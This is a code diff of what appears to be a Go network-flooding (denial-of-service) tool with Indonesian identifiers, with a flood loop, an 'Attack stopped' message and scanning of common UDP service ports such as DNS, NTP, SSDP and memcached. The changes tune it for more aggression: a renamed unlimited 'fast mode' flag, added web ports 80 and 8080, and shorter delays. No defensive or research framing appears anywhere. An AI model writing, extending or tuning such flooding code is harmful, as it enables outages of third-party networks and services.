@@ -24,7 +24,7 @@ var (
 	SIZE      int
 	VERSI     bool
 	BANDWIT   int
-	BURST     bool
+	b     bool
 	DYNAMIC   bool
 	floodRunning atomic.Bool
 	KIRIM     atomic.Uint64
@@ -45,7 +45,7 @@ func init() {
 	flag.IntVar(&SIZE, "size", 0, "UKURAN")
 	flag.BoolVar(&VERSI, "version", false, "VERSION")
 	flag.IntVar(&BANDWIT, "maxbw", 0, "MBPS")
-	flag.BoolVar(&BURST, "burst", false, "BURST MODE")
+	flag.BoolVar(&b, "b", false, "FAST MODE")
 	flag.BoolVar(&DYNAMIC, "dynamic", false, "DYNAMIC PAYLOAD")
 }
 
@@ -71,7 +71,7 @@ func main() {
 	Config()
 	CekPort(IPT)
 	if len(openPorts) == 0 {
-		openPorts = []int{53, 80, 123, 443, 1900, 5353}
+		openPorts = []int{53, 80, 8080, 123, 443, 1900, 5353}
 	}
 
 	fmt.Printf("\n💉 LINK : %s\n", LINK)
@@ -105,7 +105,7 @@ func main() {
 
 	<-sigChan
 	floodRunning.Store(false)
-	time.Sleep(800 * time.Millisecond)
+	time.Sleep(500 * time.Millisecond)
 	fmt.Println("\n[!] Attack stopped")
 }
 
@@ -229,7 +229,7 @@ func Config() {
 }
 
 func CekPort(IPT string) {
-	commonPorts := []int{53, 67, 68, 69, 123, 137, 138, 161, 500, 514, 520, 1900, 4500, 5353, 11211}
+	commonPorts := []int{53, 67, 68, 69, 80, 8080, 123, 137, 138, 161, 500, 514, 520, 1900, 4500, 5353, 11211}
 	results := make(chan int, len(commonPorts))
 	activePorts := 0
 
@@ -276,7 +276,7 @@ func Worker(IPT string) {
 		sent := 0
 		rate := int(atomic.LoadInt32(&RATE))
 
-		for (sent < rate/THREAD) || BURST {
+		for (sent < rate/THREAD) || b {
 			if portsCount == 0 {
 				continue
 			}
@@ -351,7 +351,7 @@ func Status() {
 	lastTime := start
 
 	for floodRunning.Load() {
-		time.Sleep(2 * time.Second)
+		time.Sleep(1 * time.Second)
 		current := KIRIM.Load()
 		now := time.Now()
 		elapsed := now.Sub(lastTime).Seconds()
